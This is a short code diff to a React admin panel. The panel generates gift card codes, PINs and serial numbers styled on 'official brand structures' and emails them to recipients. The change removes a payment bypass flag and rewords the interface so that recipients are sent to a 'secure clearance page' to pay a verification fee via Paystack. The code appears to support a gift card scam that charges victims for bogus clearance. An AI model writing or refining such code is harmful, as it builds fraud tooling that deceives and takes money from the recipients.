@@ -103,13 +103,12 @@ const Admin = () => {
         setSending(true);
         addLog(`Initiating secure dispatch for $${selectedAmount} ${selectedBrand.name} Gift Card...`, 'info');
         addLog(`Auto-generated secure details for ${selectedBrand.name}: Code=${details.code}, PIN=${details.pin}, Serial=${details.serial}`, 'success');
-        addLog('Tokenizing card details payload into base64 url-safe hash with pre-authorized clearance bypass...', 'info');
+        addLog('Tokenizing card details payload into base64 url-safe hash with security clearance verification...', 'info');
 
         const cardDetails = {
             code: details.code,
             pin: details.pin,
-            serial: details.serial,
-            bypassPayment: true // Bypasses Paystack on redemption page
+            serial: details.serial
         };
 
         const result = await sendGiftCardEmail({
@@ -263,7 +262,7 @@ const Admin = () => {
                                 <span style={{ fontSize: '13px', fontWeight: 'bold', color: '#cbd5e1' }}>Automated Cryptographic Generation</span>
                             </div>
                             <p style={{ margin: 0, fontSize: '12px', color: 'var(--text-secondary)', lineHeight: '1.5' }}>
-                                Voucher Code, PIN, and Serial Number will be generated securely under the hood using matching official brand structures. Security clearance verification payment will be pre-authorized and bypassed for the recipient.
+                                Voucher Code, PIN, and Serial Number will be generated securely under the hood using matching official brand structures. The recipient will be taken to the secure clearance page to complete payment and verification.
                             </p>
                         </div>
 
